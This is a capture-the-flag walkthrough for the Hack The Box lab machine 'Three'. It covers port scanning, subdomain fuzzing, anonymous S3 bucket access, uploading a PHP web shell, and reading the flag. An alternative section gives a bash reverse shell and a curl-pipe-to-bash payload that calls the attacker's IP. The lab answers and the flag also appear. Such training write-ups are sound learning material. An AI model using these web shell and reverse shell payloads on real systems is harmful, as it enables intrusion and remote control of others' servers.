---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Three

## <mark style="color:blue;">Description</mark>

* **Tier **<mark style="color:green;">**->**</mark>** 1**
* **Difficult** <mark style="color:green;">**->**</mark> Very Easy
* **OS** <mark style="color:green;">**->**</mark> Linux
* **Tags **<mark style="color:green;">**->**</mark> Cloud / Custom Applications / AWS / Reconnaissance / Web Site Structure Discovery\
  &#x20;             Bucket Enumeration / Arbitrary File Upload / Anonymous-Guest Access

<figure><img src="../../.gitbook/assets/image (121).png" alt=""><figcaption><p><a href="https://app.hackthebox.com/starting-point?tier=1">https://app.hackthebox.com/starting-point?tier=1</a></p></figcaption></figure>

## <mark style="color:blue;">Write-up</mark>

* We start doing an initial scan

<pre class="language-bash" data-line-numbers><code class="lang-bash"><strong>nmap -p- -Pn --min-rate 2000 10.129.246.158
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (216).png" alt=""><figcaption></figcaption></figure>

***

* With this, we can answer the first question

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: **2**

***

* Now we make an exhaustive scan

{% code lineNumbers="true" %}
```basic
nmap -p22,80 -sVC 10.129.246.158
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (217).png" alt=""><figcaption></figcaption></figure>

***

* As it has an HTTP service running on port 80, we know it is a web page, and we can go check it on the browser

<figure><img src="../../.gitbook/assets/image (218).png" alt=""><figcaption></figcaption></figure>

***

* As we navigate through the page, in the contact section we find some information, especially an email with a curious domain

<figure><img src="../../.gitbook/assets/image (220).png" alt=""><figcaption></figcaption></figure>

***

* With this and a little research, we can answer some questions

<figure><img src="../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>

> Answer: _**thetoppers.htb**_

***

<figure><img src="../../.gitbook/assets/image (238).png" alt=""><figcaption></figcaption></figure>

> Answer: _**/etc/hosts**_

***

* Now we can add the domain to our known domains by editing the _/etc/hosts_ file. We can do it in a faster way with the help of the `echo` and `tee` commands. Then we check the content has been saved correctly

{% code lineNumbers="true" %}
```bash
echo "10.129.246.158 thetoppers.htb" | sudo tee -a /etc/hosts
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (222).png" alt=""><figcaption></figcaption></figure>

***

* Now we can use the _gobuster_ tool to enumerate the domain with fuzzing, and specifically check if there are any related subdomains. After the operation has finished we find the subdomain _s3.thetoppers.htb_ and with a little research we can know it is a cloud database on Amazon servers.

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster vhost -u http://thetoppers.htb/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (223).png" alt=""><figcaption></figcaption></figure>

***

* With this information and some research about the Amazon service we can answer some questions

<figure><img src="../../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

> Answer: _**s3.thetoppers.htb**_

***

<figure><img src="../../.gitbook/assets/image (240).png" alt=""><figcaption></figcaption></figure>

> Answer: _**Amazon S3**_

***

<figure><img src="../../.gitbook/assets/image (241).png" alt=""><figcaption></figcaption></figure>

> Answer: _**awscli**_

***

<figure><img src="../../.gitbook/assets/image (242).png" alt=""><figcaption></figcaption></figure>

> Answer: _**aws configure**_

***

<figure><img src="../../.gitbook/assets/image (243).png" alt=""><figcaption></figcaption></figure>

> Answer: _**aws s3 ls**_

***

* We also add the discovered subdomain to the well-known host list

{% code lineNumbers="true" %}
```bash
echo "10.129.246.158 s3.thetoppers.htb" | sudo tee -a /etc/hosts
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

***

* Now we can try to connect to the S3 service with the _awscli_ utility. First, we configure the tool, in this case, we indicate that it will be a temporary connection with the _temp_ value (These are also the default credentials for AWS connections).

<figure><img src="../../.gitbook/assets/image (224).png" alt=""><figcaption></figcaption></figure>

***

* Now we try to list the S3 bucket elements and we find one named _thetoppers.htbd_

<figure><img src="../../.gitbook/assets/image (229).png" alt=""><figcaption></figcaption></figure>

***

* We try listing the bucket elements and we find an _index.php_ file, which is the main code file of the web page.

<figure><img src="../../.gitbook/assets/image (231).png" alt=""><figcaption></figcaption></figure>

***

* With this, we can answer the next question

<figure><img src="../../.gitbook/assets/image (244).png" alt=""><figcaption></figcaption></figure>

> Answer: _**PHP**_

***

* Then, as we have a connection to the S3 instance we can try to upload a custom file to the bucket with a payload to gain Remote Command Execution. We create a _Shell.php_ file for this purpose.

{% code lineNumbers="true" %}
```bash
sudo nano Shell.php
```
{% endcode %}

{% code title="Shell.php" lineNumbers="true" %}
```php
<?php system($_GET["cmd"]); ?>
```
{% endcode %}

***

* Then we upload the file to the bucket, and check it by listing the contents of the bucket again

{% code overflow="wrap" lineNumbers="true" %}
```bash
aws --endpoint=http://s3.thetoppers.htb s3 cp Shell.php s3://thetoppers.htb
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

***

* If we access the bucket from the browser and try to send _cmd_ as a parameter and a command as a value, we see the server will execute it. With this, we confirm we have gained RCE.

{% code title="Payload" lineNumbers="true" %}
```url
http://thetoppers.htb/Shell.php?cmd=id
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (233).png" alt=""><figcaption></figcaption></figure>

***

* If we go and check the _/var/www_ folder where normally is saved the information of web sites, we can see there is a _flag.txt_ file.

{% code title="Payload" lineNumbers="true" %}
```uri
http://thetoppers.htb/Shell.php?cmd=ls /var/www
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (235).png" alt=""><figcaption></figcaption></figure>

***

* Finally, we check the content of the file.

{% code title="Payload" lineNumbers="true" %}
```url
http://thetoppers.htb/Shell.php?cmd=cat /var/www/flag.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (236).png" alt=""><figcaption></figcaption></figure>

***

* With this, we have got the root flag and have pawned the machine

<figure><img src="../../.gitbook/assets/image (245).png" alt=""><figcaption></figcaption></figure>

> Answer: _**a980d99281a28d638ac68b9bf9453c2b**_

***

## <mark style="color:blue;">Alternative</mark>

* Instead of abusing the RCE directly on the browser, we can try to get a Reverse Shell on the machine. First, we create a simple bash script to send the shell connection to our machine.

{% code lineNumbers="true" %}
```bash
sudo nano shell.sh
```
{% endcode %}

{% code title="shell.sh" lineNumbers="true" %}
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.195/1234 0>&1  
#We use the IP of our machine on the VPN and an arbitrary port
```
{% endcode %}

{% hint style="info" %}
We can check our IP with the`ifconfig` command. Normally will be the one on the _tun0_ network interface as this is the interface of the VPN we are connected to.
{% endhint %}

***

* Then we establish a Netcat listener on the arbitrary port chosen above

{% code lineNumbers="true" %}
```sh
nc -nvlp 1234
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (250).png" alt=""><figcaption></figcaption></figure>

***

* After this, in another terminal, we establish an HTTP server using Python in the same folder where the _shell.sh_ file is. We choose another arbitrary port for the server.

{% code lineNumbers="true" %}
```bash
python -m http.server 4444
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>

***

* Now we use the RCE to send the shell from the target to our machine using the curl command. We will see the page remain loading.

{% code title="Payload" overflow="wrap" lineNumbers="true" %}
```url
http://thetoppers.htb/Shell.php?cmd=curl%2010.10.14.195:4444/shell.sh|bash
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (253).png" alt=""><figcaption></figcaption></figure>

***

* If we check the Python server info, we see it has received a petition

<figure><img src="../../.gitbook/assets/image (255).png" alt=""><figcaption></figcaption></figure>

***

* Finally, we can check our Netcat listener and we will see that we have gained a shell from the machine, with this we can interact with the system more comfortably.

<figure><img src="../../.gitbook/assets/image (256).png" alt=""><figcaption></figcaption></figure>
